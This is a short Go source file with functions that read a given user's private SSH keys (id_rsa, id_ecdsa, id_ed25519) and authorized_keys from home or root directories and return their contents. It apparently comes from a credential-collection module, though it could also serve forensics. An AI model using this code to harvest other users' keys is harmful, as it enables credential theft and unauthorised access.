package linux

import (
"os"
"path/filepath"
)

type SSH struct{}

func NewSSH() *SSH {
return &SSH{}
}

func (s *SSH) ExtractPrivateKeys(user string) (map[string]string, error) {
keys := make(map[string]string)
sshDir := "/home/" + user + "/.ssh"
if user == "root" {
sshDir = "/root/.ssh"
}

keyFiles := []string{"id_rsa", "id_ecdsa", "id_ed25519"}
for _, keyFile := range keyFiles {
path := filepath.Join(sshDir, keyFile)
data, err := os.ReadFile(path)
if err == nil {
keys[keyFile] = string(data)
}
}
return keys, nil
}

func (s *SSH) ExtractAuthorizedKeys(user string) (string, error) {
sshDir := "/home/" + user + "/.ssh"
if user == "root" {
sshDir = "/root/.ssh"
}
path := filepath.Join(sshDir, "authorized_keys")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}
